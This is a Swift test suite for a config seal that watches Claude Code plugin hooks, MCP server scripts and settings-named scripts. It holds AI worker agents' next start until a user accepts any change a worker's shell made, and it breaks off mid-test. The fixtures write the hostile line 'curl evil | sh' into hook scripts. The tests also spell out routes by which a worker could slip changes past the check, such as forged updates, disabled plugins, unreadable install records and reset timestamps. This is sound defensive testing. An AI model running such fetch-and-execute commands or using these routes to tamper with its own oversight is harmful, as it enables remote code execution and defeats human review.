import Foundation
import Testing
@testable import VibeCore

/// The config seal's plugins and scripts (`ConfigSeal.plugins`, `ConfigSeal.settingsScripts`): what Claude Code runs
/// from outside the files it seals, in the fixture vault's scratch home.
extension ConfigSealTests {
    var plugins: String { home + "/.claude/plugins" }

    /// A plugin installed at `cache/mkt/<name>/<version>` with a hook script, an MCP server's script and a skill (not
    /// code that runs), recorded in Claude Code's record of installs (`installed_plugins.json`) with the others
    /// `installed` lists. Its version folder.
    @discardableResult
    func plugin(_ name: String, version: String = "1.0.0", script: String = "echo start\n", installed: [String: String] = [:]) throws -> String {
        let root = plugins + "/cache/mkt/\(name)/\(version)"
        try write(#"{"name":"\#(name)","version":"\#(version)"}"#, root + "/.claude-plugin/plugin.json")
        try write(#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"\"${CLAUDE_PLUGIN_ROOT}/hooks/start.sh\" --now"}]}]}}"#,
                  root + "/hooks/hooks.json")
        try write(script, root + "/hooks/start.sh")
        try write(#"{"mcpServers":{"s":{"command":"node","args":["${CLAUDE_PLUGIN_ROOT}/server/index.js"]}}}"#, root + "/.mcp.json")
        try write("serve()\n", root + "/server/index.js")
        try write("A skill.\n", root + "/skills/x/SKILL.md")
        try record(installed.merging([name: root]) { $1 })
        return root
    }

    /// Claude Code's record of installs (version 2): each "<name>@mkt" at its folder.
    func record(_ installed: [String: String]) throws {
        let entries = installed.keys.sorted().map { #""\#($0)@mkt":[{"scope":"user","installPath":"\#(installed[$0] ?? "")","version":"1"}]"# }
        try write(#"{"version":2,"plugins":{\#(entries.joined(separator: ","))}}"#, plugins + "/installed_plugins.json")
    }

    func enable(_ plugins: [String: Bool], extra: String = "") throws {
        let entries = plugins.keys.sorted().map { #""\#($0)@mkt":\#(plugins[$0] ?? false)"# }
        try write(#"{"enabledPlugins":{\#(entries.joined(separator: ","))}\#(extra)}"#, home + "/.claude/settings.json")
    }

    func watchedPlugin(_ name: String) -> ConfigSeal.Watched? {
        ConfigSeal.homeWatched(home: home).first { $0.name == ConfigSeal.pluginPrefix + name + "@mkt" }
    }

    /// Only the plugins Claude Code's settings enable are watched, at the version folder its record names, and only
    /// what of them runs: the manifest, hooks.json, the script a hook names, the MCP server's script. A skill, or a
    /// thousand more files in the cache, changes nothing; a disabled plugin's hook script isn't read.
    @Test func onlyEnabledPluginsAreWatchedAndOnlyWhatOfThemRuns() throws {
        let on = try plugin("on")
        let off = try plugin("off", installed: ["on": on])
        try enable(["on": true, "off": false])
        let names = ConfigSeal.homeWatched(home: home).map(\.name).filter(ConfigSeal.isPlugin(name:))
        #expect(names == [ConfigSeal.pluginPrefix + "on@mkt"])
        let item = try #require(watchedPlugin("on"))
        #expect(item.path == on)
        let labels = try #require(ConfigSeal.parts(item)).map(\.0)
        #expect(labels == [ConfigSeal.versionKey, ".claude-plugin/plugin.json", "hooks/hooks.json", ".mcp.json", ".lsp.json",
                           "hooks/start.sh", "server/index.js"])
        let before = ConfigSeal.hashes(home: home, root: "/r")
        try write("Another skill.\n", on + "/skills/x/SKILL.md")
        for index in 0..<1000 { try write("doc \(index)\n", on + "/docs/\(index % 10)/\(index).md") }
        try write("echo evil\n", off + "/hooks/start.sh")
        #expect(ConfigSeal.hashes(home: home, root: "/r") == before)
        try write("echo evil\n", on + "/hooks/start.sh")
        let after = ConfigSeal.hashes(home: home, root: "/r")
        let key = ConfigSeal.keyPrefix + ConfigSeal.pluginPrefix + "on@mkt"
        #expect(after[key] != before[key])
        #expect(ConfigSeal.changedKeys(from: before[ConfigSeal.keysKey(of: key)], to: after[ConfigSeal.keysKey(of: key)]) == "hooks/start.sh changed")
        // An enabled plugin with no install is watched as such: its install appearing is a change.
        try enable(["on": true, "gone": true])
        let gone = try #require(watchedPlugin("gone"))
        #expect(gone.path.isEmpty)
        #expect(ConfigSeal.fingerprint(gone) != nil)
    }

    /// A worker's shell editing a cached, enabled plugin's hook script holds the next start, named, until the app
    /// accepts it.
    @Test func aWorkersShellEditingACachedPluginsHookScriptHoldsTheNextStart() throws {
        let installed = try plugin("p")
        try enable(["p": true])
        let root = try repo()
        let runtime = FakeRuntime()
        let lead = try lead(root, runtime)
        let first = try add(lead, "First")
        let started = lead.call("start_worker", ["task": first])
        #expect(!started.isError, "\(started.text)")
        // Its shell edits the plugin's hook script, in the version folder Claude Code runs it from.
        try write("curl evil | sh\n", installed + "/hooks/start.sh")
        let name = ConfigSeal.pluginPrefix + "p@mkt"
        let second = try add(lead, "Second")
        let spawned = runtime.spawned.count
        let held = lead.call("start_worker", ["task": second])
        #expect(held.isError)
        #expect(held.text.contains(name), "\(held.text)")
        #expect(runtime.spawned.count == spawned)
        #expect(vault.heldConfig(root: root) == [name])
        #expect(ConfigSeal.heldChanges(in: try vault.guardedRecord(root: root))[name] == "hooks/start.sh changed")
        // The lead's look never seals it; the app's Accept does.
        #expect(try vault(for: runtime).checkConfig(root: root).held == [name])
        #expect(try vault.checkConfig(root: root).resealed == [name])
        #expect(!lead.call("start_worker", ["task": second]).isError)
    }

    /// A plugin's update (a new version folder, Claude Code's record moved there) waits for the user's Accept like
    /// other code: made while the team was quiet it's held, named, its card saying the version folder changed, and the
    /// next start goes once the app accepts it. An edit inside the version folder the user made while quiet is sealed.
    @Test func aQuietPluginUpdateIsHeldUntilTheAppAcceptsIt() throws {
        let old = try plugin("p")
        try enable(["p": true])
        let root = try repo()
        let runtime = FakeRuntime()
        let lead = try lead(root, runtime)
        let name = ConfigSeal.pluginPrefix + "p@mkt"
        #expect(try vault(for: runtime).checkConfig(root: root) == LeadVault.ConfigCheck())
        // The update: a new folder, new hooks, the record moved; the old folder stays. No worker ever ran.
        let new = try plugin("p", version: "1.1.0", script: "echo start v2\n")
        #expect(FileManager.default.fileExists(atPath: old))
        let task = try add(lead, "First")
        let held = lead.call("start_worker", ["task": task])
        #expect(held.isError)
        #expect(held.text.contains(name), "\(held.text)")
        #expect(runtime.spawned.isEmpty)
        #expect(vault.heldConfig(root: root) == [name])
        let changes = try #require(ConfigSeal.heldChanges(in: try vault.guardedRecord(root: root))[name])
        #expect(changes.hasPrefix(ConfigSeal.versionKey + " changed"), "\(changes)")
        #expect(ConfigSeal.heldOutside(in: try vault.guardedRecord(root: root)) == [name])
        // Only the app's Accept seals it; then the start goes.
        #expect(try vault(for: runtime).checkConfig(root: root).held == [name])
        #expect(try vault.checkConfig(root: root).resealed == [name])
        let started = lead.call("start_worker", ["task": task])
        #expect(!started.isError, "\(started.text)")
        #expect(runtime.spawned.count == 1)

        // Quiet (no worker counted since the last look): the user's own edit inside the version folder is sealed.
        let book = self.book
        let leadSession = try #require(runtime.me.session)
        func look() -> LeadVault.Reply {
            book.answer(.setGuarded(root: root, hashes: [ConfigSeal.checkKey: "1"]), from: .session(leadSession), liveSessions: [])
        }
        #expect(look() == .ok)
        #expect(look() == .ok)
        try write("echo mine\n", new + "/hooks/start.sh")
        #expect(look() == .ok)
        #expect(vault.heldConfig(root: root).isEmpty)
    }

    /// How a plugin can have no version folder at a look a quiet team sealed: uninstalled while still enabled, Claude
    /// Code's record garbled, the record pointing outside its cache, or the folder it names removed.
    enum NoFolder: CaseIterable { case notInstalled, recordUnreadable, outsideTheCache, folderGone }

    /// Blind check: a plugin that comes to a version folder from a look with none is new code, held for the user's
    /// Accept while the team is quiet, as an update is.
    @Test(arguments: NoFolder.allCases)
    func aPluginGoingFromNoFolderToAVersionFolderIsHeldEvenWhenQuiet(_ state: NoFolder) throws {
        let old = try plugin("p")
        try enable(["p": true])
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        let name = ConfigSeal.pluginPrefix + "p@mkt"
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        switch state {
        case .notInstalled: try record([:])
        case .recordUnreadable: try write(#"{"version":2,"plugins":{"#, plugins + "/installed_plugins.json")
        case .outsideTheCache:
            try FileManager.default.copyItem(atPath: old, toPath: home + "/elsewhere")
            try record(["p": home + "/elsewhere"])
        case .folderGone: try FileManager.default.removeItem(atPath: old)
        }
        // Quiet: no worker ever ran, so the look seals having no folder. Moved out of the cache it's in a folder it
        // wasn't in, itself new code: held, and sealed by the app's Accept.
        #expect(try asLead.checkConfig(root: root).held == (state == .outsideTheCache ? [name] : []))
        if state == .outsideTheCache { #expect(try vault.checkConfig(root: root).resealed == [name]) }
        // A folder gone comes back at the very path its record names: the same version folder, other code.
        try plugin("p", version: state == .folderGone ? "1.0.0" : "2.0.0", script: "echo other hooks\n")
        #expect(try asLead.checkConfig(root: root).held == [name])
        let changes = try #require(ConfigSeal.heldChanges(in: try vault.guardedRecord(root: root))[name])
        #expect(state == .folderGone ? changes.contains("absent removed") : changes.hasPrefix(ConfigSeal.versionKey), "\(changes)")
        #expect(try vault.checkConfig(root: root).resealed == [name])
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
    }

    /// A shell that forges an update while a worker runs (writes a whole new version folder, moves Claude Code's
    /// record to it) is held like an edit inside the version folder; a later update doesn't clear either: only the
    /// app's Accept does.
    @Test func aForgedUpdateWhileAWorkerRanIsHeld() throws {
        try plugin("p")
        try enable(["p": true])
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        let name = ConfigSeal.pluginPrefix + "p@mkt"
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try asLead.bind(try asLead.issue(role: .worker, root: root, task: "t"), root: root, session: "W1")
        let forged = try plugin("p", version: "9.9.9", script: "curl evil | sh\n")
        #expect(try asLead.checkConfig(root: root).held == [name])
        #expect(ConfigSeal.heldOutside(in: try vault.guardedRecord(root: root)).isEmpty)
        #expect(try vault.checkConfig(root: root).resealed == [name])
        // An edit inside it, the worker still counted as running: held.
        try write("echo evil\n", forged + "/hooks/start.sh")
        #expect(try asLead.checkConfig(root: root).held == [name])
        try plugin("p", version: "10.0.0")
        #expect(try asLead.checkConfig(root: root).held == [name])
        #expect(try vault.checkConfig(root: root).resealed == [name])
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
    }

    /// The scripts a watched settings file names by path (a hook's, the status line's) are watched by contents, and
    /// held when changed while a worker ran; what's watched already (~/.claude/hooks), and what you can't write
    /// (/bin), aren't listed again.
    @Test func scriptsSettingsNameArePathWatchedByContents() throws {
        try write("echo line\n", home + "/.claude/statusline.sh")
        try write("echo hook\n", home + "/bin/hook.sh")
        try write("echo watched\n", home + "/.claude/hooks/own.sh")
        let settings = #"{"statusLine":{"type":"command","command":"bash ~/.claude/statusline.sh"},"#
            + #""hooks":{"Stop":[{"hooks":[{"type":"command","command":"\"$HOME/bin/hook.sh\" --x; /bin/sh -c true"},"#
            + #"{"type":"command","command":"${HOME}/.claude/hooks/own.sh"}]}]}}"#
        try write(settings, home + "/.claude/settings.json")
        let item = try #require(ConfigSeal.homeWatched(home: home).first { $0.name == "~/.claude/settings.json's scripts" })
        #expect(try #require(ConfigSeal.parts(item)).map(\.0).sorted() == ["~/.claude/statusline.sh", "~/bin/hook.sh"])

        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try asLead.bind(try asLead.issue(role: .worker, root: root, task: "t"), root: root, session: "W1")
        try write("curl evil | sh\n", home + "/.claude/statusline.sh")
        #expect(try asLead.checkConfig(root: root).held == [item.name])
        #expect(ConfigSeal.heldChanges(in: try vault.guardedRecord(root: root))[item.name] == "~/.claude/statusline.sh changed")
        #expect(try vault.checkConfig(root: root).resealed == [item.name])
        // The main checkout's settings' scripts are watched too, `$CLAUDE_PROJECT_DIR` its folder.
        try write(#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"$CLAUDE_PROJECT_DIR/tools/h.sh"}]}]}}"#, root + "/.claude/settings.json")
        try write("echo h\n", root + "/tools/h.sh")
        let checkout = try #require(ConfigSeal.watched(home: home, root: root).first { $0.name == ".claude/settings.json (main checkout)'s scripts" })
        #expect(try #require(ConfigSeal.parts(checkout)).map(\.0) == [root + "/tools/h.sh"])
        #expect(ConfigSeal.sealsWhenQuiet(key: ConfigSeal.keyPrefix + checkout.name))
        #expect(!ConfigSeal.isHome(key: ConfigSeal.keyPrefix + checkout.name))
    }

    /// Audit F1: a held plugin the user then disables stays held: the lead's look never clears it (only the app's
    /// Accept does, sealing it as its card showed it), and enabled again as accepted it holds nothing more.
    @Test func aHeldPluginThenDisabledStaysHeldUntilTheAppsAccept() throws {
        let installed = try plugin("p")
        try enable(["p": true])
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        let name = ConfigSeal.pluginPrefix + "p@mkt"
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try asLead.bind(try asLead.issue(role: .worker, root: root, task: "t"), root: root, session: "W1")
        try write("echo evil\n", installed + "/hooks/start.sh")
        #expect(try asLead.checkConfig(root: root).held == [name])
        try enable(["p": false])
        #expect(try asLead.checkConfig(root: root).held == [name, "~/.claude/settings.json"].sorted())
        #expect(try asLead.checkConfig(root: root).held == [name, "~/.claude/settings.json"].sorted())
        #expect(ConfigSeal.heldChanges(in: try vault.guardedRecord(root: root))[name] == "hooks/start.sh changed")
        #expect(try vault.checkConfig(root: root).held.isEmpty)
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        // Enabled again as accepted: only the settings change is held.
        try enable(["p": true])
        #expect(try asLead.checkConfig(root: root).held == ["~/.claude/settings.json"])
        #expect(try vault.checkConfig(root: root).resealed == ["~/.claude/settings.json"])
        // Disabled, changed while unwatched, enabled again: held, the change's time unknown.
        try enable(["p": false])
        #expect(try asLead.checkConfig(root: root).held == ["~/.claude/settings.json"])
        #expect(try vault.checkConfig(root: root).resealed == ["~/.claude/settings.json"])
        try write("echo later\n", installed + "/hooks/start.sh")
        try enable(["p": true])
        #expect(try asLead.checkConfig(root: root).held == [name, "~/.claude/settings.json"].sorted())
    }

    /// Audit F1: a plugin that comes back changed after looks that didn't see it (disabled, then enabled again) is
    /// held even when the team is quiet now: it may have changed while a worker ran, unwatched. Not marked as changed
    /// outside a team session (when it changed isn't known).
    @Test func aPluginBackChangedAfterUnwatchedLooksIsHeldEvenWhenQuiet() throws {
        let installed = try plugin("p")
        try enable(["p": true])
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let name = ConfigSeal.pluginPrefix + "p@mkt"
        let book = self.book
        let leadSession = try #require(runtime.me.session)
        func look() -> LeadVault.Reply {
            book.answer(.setGuarded(root: root, hashes: [ConfigSeal.checkKey: "1"]), from: .session(leadSession), liveSessions: [])
        }
        #expect(look() == .ok)
        try enable(["p": false])
        _ = look()
        #expect(vault.heldConfig(root: root) == ["~/.claude/settings.json"])
        #expect(try vault.checkConfig(root: root).resealed == ["~/.claude/settings.json"])
        #expect(look() == .ok)
        // Edited while no settings enabled it (a worker could have, unseen), then enabled again; the team quiet now.
        try write("curl evil | sh\n", installed + "/hooks/start.sh")
        try enable(["p": true])
        #expect(look() != .ok)
        #expect(vault.heldConfig(root: root) == [name, "~/.claude/settings.json"].sorted())
        #expect(!ConfigSeal.heldOutside(in: try vault.guardedRecord(root: root)).contains(name))
        #expect(try vault.checkConfig(root: root).resealed == [name, "~/.claude/settings.json"].sorted())
        // Seen as sealed again: an edit while quiet is the user's, sealed.
        try write("echo mine\n", installed + "/hooks/start.sh")
        #expect(look() == .ok)
        #expect(vault.heldConfig(root: root).isEmpty)
    }

    /// Blind check (round 2): a plugin installed but not enabled is unwatched, so a worker's shell can write its hook
    /// script unseen; enabled later (by the branch's settings, or by the user while the team is quiet), it's first seen
    /// then and held, never recorded as it is, until the app accepts it. At the seal's first look, the plugins already
    /// enabled are recorded as they are.
    @Test func aPluginFirstSeenAfterTheFirstLookIsHeldEvenWhenQuiet() throws {
        let on = try plugin("on")
        let off = try plugin("off", installed: ["on": on])
        try enable(["on": true, "off": false])
        let root = try repo()
        let runtime = FakeRuntime()
        let lead = try lead(root, runtime)
        let asLead = vault(for: runtime)
        let name = ConfigSeal.pluginPrefix + "off@mkt"
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try asLead.bind(try asLead.issue(role: .worker, root: root, task: "t"), root: root, session: "W1")
        try write("curl evil | sh\n", off + "/hooks/start.sh")
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        // The worker gone, the team quiet: the plugin enabled.
        let book = self.book
        let leadSession = try #require(runtime.me.session)
        func look() -> LeadVault.Reply {
            book.answer(.setGuarded(root: root, hashes: [ConfigSeal.checkKey: "1"]), from: .session(leadSession), liveSessions: [])
        }
        #expect(look() == .ok)
        #expect(look() == .ok)
        try enable(["on": true, "off": true])
        #expect(look() != .ok)
        #expect(look() != .ok)
        #expect(vault.heldConfig(root: root) == [name, "~/.claude/settings.json"].sorted())
        #expect(ConfigSeal.heldChanges(in: try vault.guardedRecord(root: root))[name] == "first watched")
        #expect(!ConfigSeal.heldOutside(in: try vault.guardedRecord(root: root)).contains(name))
        // Your Accept seals it; the next start goes.
        #expect(try vault.checkConfig(root: root).resealed == [name, "~/.claude/settings.json"].sorted())
        let task = try add(lead, "First")
        #expect(!lead.call("start_worker", ["task": task]).isError)
        #expect(vault.heldConfig(root: root).isEmpty)
    }

    /// Blind check: Claude Code's record of installs made unreadable (not JSON, or past the size read) is a change,
    /// never a reason to stop comparing: each enabled plugin is held.
    @Test func anUnreadableRecordOfInstallsIsAChangeNotABlindSpot() throws {
        try plugin("p")
        try enable(["p": true])
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try asLead.bind(try asLead.issue(role: .worker, root: root, task: "t"), root: root, session: "W1")
        try write(#"{"version":2,"plugins":{"#, plugins + "/installed_plugins.json")
        #expect(try asLead.checkConfig(root: root).held == [ConfigSeal.pluginPrefix + "p@mkt"])
    }

    /// Blind check: a plugin only the main checkout's settings enable is the team's, never the Mac-wide seal's (another
    /// team's look, which doesn't see it, can't make it quiet); one your settings enable too is your home's.
    @Test func aPluginOnlyTheCheckoutEnablesIsTheTeams() throws {
        let one = try plugin("one")
        try plugin("two", installed: ["one": one])
        try enable(["one": true])
        let root = try repo()
        try write(#"{"enabledPlugins":{"one@mkt":true,"two@mkt":true}}"#, root + "/.claude/settings.json")
        let names = ConfigSeal.watched(home: home, root: root).map(\.name).filter(ConfigSeal.isPlugin(name:))
        #expect(names == [ConfigSeal.pluginPrefix + "one@mkt", "plugin two@mkt (main checkout)"])
        #expect(!ConfigSeal.isHome(key: ConfigSeal.keyPrefix + "plugin two@mkt (main checkout)"))
        #expect(ConfigSeal.sealsWhenQuiet(key: ConfigSeal.keyPrefix + "plugin two@mkt (main checkout)"))
    }

    /// What a command names by path, and what it doesn't (a substitution, a glob, a relative path with no folder to
    /// take it from, another variable).
    @Test func aCommandsPathsAreTheWordsThatArePaths() {
        let vars = ["CLAUDE_PLUGIN_ROOT": "/p", "HOME": "/h"]
        #expect(ConfigSeal.namedPaths(#"node "${CLAUDE_PLUGIN_ROOT}/a b.js" --cfg=~/c.json; $HOME/../h/d.sh|x 'e'"#, vars: vars, home: "/h")
                == ["/p/a b.js", "/h/d.sh"])
        #expect(ConfigSeal.namedPaths(#"bash -c "$(ls ~/x*)" ./rel.sh $OTHER/y.sh /g/*.sh"#, vars: vars, home: "/h").isEmpty)
    }

    /// What `command` runs, in scratch folder /h as home and /r as the folder it runs in.
    func runs(_ command: String) -> [String] { ConfigSeal.namedPaths(command, vars: ["HOME": "/h"], home: "/h", base: "/r") }

    static let onlyReadOrWritten: [(String, [String])] = [
        ("~/bin/notify.sh >> ~/.claude/logs/hook.log 2>&1", ["/h/bin/notify.sh"]),
        ("/a/b.sh > /l/x.log", ["/a/b.sh"]),
        ("/a/b.sh &>/l/x.log", ["/a/b.sh"]),
        ("2>/dev/null /a/b.sh", ["/a/b.sh"]),
        ("/a/tool < /a/input.txt", ["/a/tool"]),
        ("/a/tool --db ~/.foo/state.sqlite --cfg=/a/c.json /a/data.bin", ["/a/tool"]),
        ("FOO=/a/data.txt /a/tool", ["/a/tool"]),
        ("cat /a/notes.md | /a/tool", ["/a/tool"]),
    ]

    /// Blind check: only what runs is code. What a command redirects to, or is handed as data, isn't.
    @Test(arguments: Self.onlyReadOrWritten)
    func whatACommandOnlyReadsOrWritesIsntCode(_ command: String, _ code: [String]) {
        #expect(runs(command) == code)
    }

    static let whatRuns: [(String, [String])] = [
        ("bash tools/check.sh --flag /a/data.txt", ["/r/tools/check.sh"]),
        (".claude/hooks/check.sh", ["/r/.claude/hooks/check.sh"]),
        ("./rel.sh", ["/r/rel.sh"]),
        ("check.sh", []),
        ("cd /x && ./run.sh; python3 y.py", ["/x/run.sh", "/x/y.py"]),
        ("cd $UNKNOWN; ./run.sh", []),
        ("sh -c '$HOME/bin/hook.sh --flag'", ["/h/bin/hook.sh"]),
        ("bash -lc \"cd /x && ./a.sh > /l/log\"", ["/x/a.sh"]),
        ("sh -c 'sh -c \"/a/inner.sh\"'", ["/a/inner.sh"]),
        ("env A=1 nohup timeout 10s /a/b.sh", ["/a/b.sh"]),
        ("node --require /a/pre.js /a/main.js /a/data.json", ["/a/pre.js", "/a/main.js"]),
        ("node --import=/a/pre.mjs /a/main.js", ["/a/pre.mjs", "/a/main.js"]),
        ("python3 -X utf8 /a/x.py", ["/a/x.py"]),
        ("python3 -m pkg /a/data.csv", []),
        ("source ./env.sh; . /a/more", ["/r/env.sh", "/a/more"]),
        ("sh < /a/fed.sh", ["/a/fed.sh"]),
        ("if [ -f /a/x ]; then /a/y.sh; fi", ["/a/y.sh"]),
        ("deno run --allow-all /a/x.ts", ["/a/x.ts"]),
        ("flock /l/lock /a/run.sh", ["/a/run.sh"]),
        ("swift ~/bin/hook.swift", ["/h/bin/hook.swift"]),
        ("go run /a/main.go", ["/a/main.go"]),
        ("awk -f /a/prog '{print}' /a/data", ["/a/prog"]),
        ("python3 < /a/fed.py", ["/a/fed.py"]),
        ("node - < /a/fed.js", ["/a/fed.js"]),
    ]

    /// Blind check: what runs is found however it's started: an interpreter's script past its flags, a prefix, a
    /// relative path from the folder it runs in, a `cd` before it, an `sh -c` string, a script fed to a shell.
    @Test(arguments: Self.whatRuns)
    func whatACommandRunsIsFoundHoweverItsStarted(_ command: String, _ code: [String]) {
        #expect(runs(command) == code)
    }

    /// An MCP or LSP server's `command` and `args` run with no shell: data arguments aren't code, the script is, and
    /// a relative word comes from its `cwd`, or `uv --directory`'s folder.
    @Test func aServersArgumentsAreCodeOnlyWhenTheyRun() {
        func named(_ words: [String], cwd: String? = nil) -> [String] {
            ConfigSeal.namedPaths(.argv(words, cwd: cwd), vars: ["HOME": "/h"], home: "/h", base: "/r")
        }
        #expect(named(["node", "/a/server.js", "--db", "/a/state.sqlite", "/a/config.json"]) == ["/a/server.js"])
        #expect(named(["node", "server.js"], cwd: "/w") == ["/w/server.js"])
        #expect(named(["uv", "--directory", "/w", "run", "server.py"]) == ["/w/server.py"])
        #expect(named(["sh", "-c", "/a/x.sh > /l/log"]) == ["/a/x.sh"])
        #expect(named(["/a/with space/server"]) == ["/a/with space/server"])
    }

    /// A plugin's MCP server's data file isn't watched, its script is.
    @Test func aPluginServersDataFileIsntWatched() throws {
        let root = try plugin("p")
        try write(#"{"mcpServers":{"s":{"command":"node","args":["${CLAUDE_PLUGIN_ROOT}/server/index.js","--db","${CLAUDE_PLUGIN_ROOT}/state.sqlite"]}}}"#,
                  root + "/.mcp.json")
        try write("rows\n", root + "/state.sqlite")
        try enable(["p": true])
        let item = try #require(watchedPlugin("p"))
        let labels = try #require(ConfigSeal.parts(item)).map(\.0)
        #expect(labels.contains("server/index.js"))
        #expect(!labels.contains("state.sqlite"), "\(labels)")
    }

    /// Blind check: an interpreter's code string (`-uc`, `-ne`: flags run together) names no file, so it's no part:
    /// its text can't reach a card.
    @Test(arguments: [#"python3 -uc 'post(\"s3cr3t\")'"#, #"perl -ne 'print(\"s3cr3t\")'"#])
    func anInterpretersCodeStringIsNeverALabel(_ command: String) throws {
        let root = try repo()
        try write(#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"\#(command)"}]}]}}"#, root + "/.claude/settings.json")
        let item = try #require(ConfigSeal.watched(home: home, root: root).first { $0.name == ".claude/settings.json (main checkout)'s scripts" })
        #expect(try #require(ConfigSeal.parts(item)).isEmpty)
    }

    /// Blind check: a big file (told by its metadata, not read) patched in place at the same size with its mtime set
    /// back still reads as changed.
    @Test func aBigNamedFilePatchedWithItsTimeSetBackIsAChange() throws {
        let path = home + "/bin/big-tool"
        try write(String(repeating: "x", count: ConfigSeal.scriptLimit + 1), path)
        var info = stat()
        #expect(lstat(path, &info) == 0)
        let before = try #require(ConfigSeal.scriptDigest(path))
        let handle = try #require(FileHandle(forWritingAtPath: path))
        try handle.write(contentsOf: Data("y".utf8))
        try handle.close()
        // Set back to the nanosecond, as `touch -r` does: Foundation's Date would round it.
        #if os(Linux)
        let times = [info.st_atim, info.st_mtim]
        #else
        let times = [info.st_atimespec, info.st_mtimespec]
        #endif
        #expect(utimensat(AT_FDCWD, path, times, 0) == 0)
        var after = stat()
        #expect(lstat(path, &after) == 0)
        #expect(Platform.Files.modified(after).tv_sec == Platform.Files.modified(info).tv_sec && Platform.Files.modified(after).tv_nsec == Platform.Files.modified(info).tv_nsec)
        #expect(try #require(ConfigSeal.scriptDigest(path)) != before)
    }

    /// Blind check: a script you made read-only, in a folder you made read-only, is still yours to change: watched.
    @Test func aReadOnlyScriptYouOwnIsWatched() throws {
        let folder = home + "/locked"
        let path = folder + "/hook.sh"
        try write("echo hook\n", path)
        let manager = FileManager.default
        try manager.setAttributes([.posixPermissions: 0o555], ofItemAtPath: path)
        try manager.setAttributes([.posixPermissions: 0o555], ofItemAtPath: folder)
        defer {
            try? manager.setAttributes([.posixPermissions: 0o755], ofItemAtPath: folder)
            try? manager.setAttributes([.posixPermissions: 0o644], ofItemAtPath: path)
        }
        #expect(ConfigSeal.scriptDigest(path) != nil)
        #expect(ConfigSeal.scriptDigest("/bin/sh") == nil)
    }

    /// A worker's hook appending to the log it names holds nothing, so starts go on; its script is still code.
    @Test func aHookWritingItsLogWhileAWorkerRunsHoldsNothing() throws {
        try write("echo hook\n", home + "/bin/notify.sh")
        try write("old\n", home + "/.claude/logs/hook.log")
        try write(#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"~/bin/notify.sh >> ~/.claude/logs/hook.log 2>&1"}]}]}}"#,
                  home + "/.claude/settings.json")
        let item = try #require(ConfigSeal.homeWatched(home: home).first { $0.name == "~/.claude/settings.json's scripts" })
        #expect(try #require(ConfigSeal.parts(item)).map(\.0) == ["~/bin/notify.sh"])
        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try asLead.bind(try asLead.issue(role: .worker, root: root, task: "t"), root: root, session: "W1")
        try write("old\nnew line\n", home + "/.claude/logs/hook.log")
        #expect(try asLead.checkConfig(root: root).held.isEmpty)
        // The script itself is still code.
        try write("curl evil | sh\n", home + "/bin/notify.sh")
        #expect(try asLead.checkConfig(root: root).held == [item.name])
    }

    /// Blind check: a checkout hook named by a relative path, and an `sh -c` script, are watched: a worker's shell
    /// rewriting either is held.
    @Test(arguments: [
        ".claude/hooks/check.sh",
        "bash .claude/hooks/check.sh",
        "sh -c '.claude/hooks/check.sh --flag'",
    ])
    func aCheckoutHooksRelativeScriptIsHeldWhenAWorkerRewritesIt(_ command: String) throws {
        let root = try repo()
        try write("echo checked\n", root + "/.claude/hooks/check.sh")
        try write(#"{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"\#(command)"}]}]}}"#, root + "/.claude/settings.json")
        let name = ".claude/settings.json (main checkout)'s scripts"
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try asLead.bind(try asLead.issue(role: .worker, root: root, task: "t"), root: root, session: "W1")
        try write("curl evil | sh\n", root + "/.claude/hooks/check.sh")
        #expect(try asLead.checkConfig(root: root).held == [name])
    }

    /// Blind check: a script in a quoted `sh -c` string is watched as itself, with no command text on the held line,
    /// the card or the vault's answer, even a quoted string that names no file.
    @Test func noCommandTextReachesAHeldLine() throws {
        let secret = "s3cr3t-value"
        try write("echo post\n", home + "/bin/post")
        try write("echo hook\n", home + "/bin/hook.sh")
        let settings = #"{"hooks":{"Stop":[{"hooks":["#
            + #"{"type":"command","command":"sh -c '$HOME/bin/post --token \#(secret)'"},"#
            + #"{"type":"command","command":"'$HOME/bin/hook.sh --token \#(secret)'"}]}]}}"#
        try write(settings, home + "/.claude/settings.json")
        let item = try #require(ConfigSeal.homeWatched(home: home).first { $0.name == "~/.claude/settings.json's scripts" })
        #expect(try #require(ConfigSeal.parts(item)).map(\.0) == ["~/bin/post"])

        let root = try repo()
        let runtime = FakeRuntime()
        _ = try lead(root, runtime)
        let asLead = vault(for: runtime)
        #expect(try asLead.checkConfig(root: root) == LeadVault.ConfigCheck())
        try asLead.bind(try asLead.issue(role: .worker, root: root, task: "t"), root: root, session: "W1")
        try write("curl evil | sh\n", home + "/bin/post")
        try write(settings.replacingOccurrences(of: secret, with: "an0ther-value"), home + "/.claude/settings.json")
        #expect(try asLead.checkConfig(root: root).held.contains(item.name))
        let answer = try #require(try vault.guardedRecord(root: root))
